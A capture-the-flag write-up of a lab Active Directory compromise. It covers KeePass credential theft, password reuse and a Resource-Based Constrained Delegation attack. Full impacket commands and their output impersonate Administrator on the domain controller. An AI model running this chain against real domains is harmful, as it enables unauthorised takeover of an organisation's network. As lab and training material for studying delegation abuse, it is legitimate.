Target : DC01 (10.48.163.143) - Windows Server 2019 - Domain Controller
Domain : ctf.local
Goal   : Capture the Administrator flag on DC01

Attack chain summary
--------------------
1. Assumed breach: j.smith:JSmith@IT2024 (valid SMB/LDAP, member of Remote
   Desktop Users -> RDP into DC01)
2. Enumerate the domain (users, groups, delegation, BloodHound) and hunt
   for credentials on the box
3. A KeePass database (Database.kdbx) in j.smith's profile is protected by
   the WINDOWS USER ACCOUNT, not a master password -> opens as j.smith
4. It leaks t.jones:Helpdesk01!
5. Password reuse spray: Helpdesk01! is also valid for r.williams
   (same helpdesk team manages the same password)
6. BloodHound path: r.williams has AddAllowedToAct (write access to
   msDS-AllowedToActOnBehalfOfOtherIdentity) on DC01$
7. Resource-Based Constrained Delegation (RBCD) attack:
   - create attacker-controlled machine account ATTACKERSYSTEM$
   - write it into DC01$'s delegation attribute
   - S4U2Self + S4U2Proxy to impersonate Administrator for cifs/DC01
8. impacket-smbexec with the forged ticket -> SYSTEM shell on DC01
9. Read C:\Users\Administrator\Desktop\flag.txt (optional: DCSync)

================================================================================
STEP 5 - BloodHound path: AddAllowedToAct on DC01$
================================================================================

r.williams has AddAllowedToAct (AllowedToAuthenticate... write to
msDS-AllowedToActOnBehalfOfOtherIdentity) over DC01$. This is the
Resource-Based Constrained Delegation primitive: we control WHICH account
is trusted to delegate to the DC.

================================================================================
STEP 6 - RBCD attack chain
================================================================================

1) Create an attacker-controlled machine account:

    impacket-addcomputer -computer-name 'ATTACKERSYSTEM$' \
        -computer-pass 'Pwned123@!' -dc-host 10.48.163.143 \
        -domain-netbios ctf.local 'ctf.local/r.williams:Helpdesk01!'

        [*] Successfully added machine account ATTACKERSYSTEM$ ...

2) Write it into DC01$'s msDS-AllowedToActOnBehalfOfOtherIdentity:

    impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'DC01$' \
        -action 'write' -dc-ip 10.48.163.143 'ctf.local/r.williams:Helpdesk01!'

        [*] Delegation rights modified successfully!
        [*] ATTACKERSYSTEM$ can now impersonate users on DC01$ via S4U2Proxy

   (If r.williams lacked the permission this write would fail - the step
   is self-verifying.)

3) Request a service ticket impersonating Administrator:

    unset KRB5CCNAME        # <-- important, see troubleshooting
    impacket-getST -dc-ip 10.48.163.143 \
        -spn 'cifs/DC01.ctf.local' -impersonate 'Administrator' \
        'ctf.local/ATTACKERSYSTEM$:Pwned123@!'

        [*] Getting TGT for user
        [*] Impersonating Administrator
        [*] Requesting S4U2self
        [*] Requesting S4U2Proxy
        [*] Saving ticket in Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache

================================================================================
Troubleshooting notes
================================================================================
- /etc/hosts: getST resolves the KDC by realm (CTF.LOCAL:88) and smbexec
  resolves the SPN host (DC01.ctf.local). Both MUST resolve to the DC IP.
  A typo (10.48.1643.143) broke the whole chain.
- KRB5CCNAME trap: with KRB5CCNAME exported to a file that does not exist
  yet, getST first tries to READ that ccache for a cached TGT
  (CCache.parseFile in run()) and dies with "[Errno 2] No such file or
  directory" before contacting the KDC. Run getST with KRB5CCNAME unset,
  then export it to the created ticket before smbexec.
- nxc -u users.txt reads the file only if it exists; otherwise it treats
  "users.txt" as a literal username.
================================================================================
Key takeaways
================================================================================
- KeePass databases bound to a Windows user account are effectively open
  to anyone operating as that user - always hunt for .kdbx files in user
  profiles.
- Helpdesk/IT teams reuse passwords across accounts - one leaked credential
  becomes many.
- AddAllowedToAct (write on msDS-AllowedToActOnBehalfOfOtherIdentity) is
  as powerful as GenericAll for RBCD: create a machine account, delegate
  to it, and impersonate any principal (Administrator) to the target.
- The rbcd.py write is self-verifying: if it succeeds you had the right.
- Always fix /etc/hosts for BOTH the realm (upper case) and the SPN FQDN.
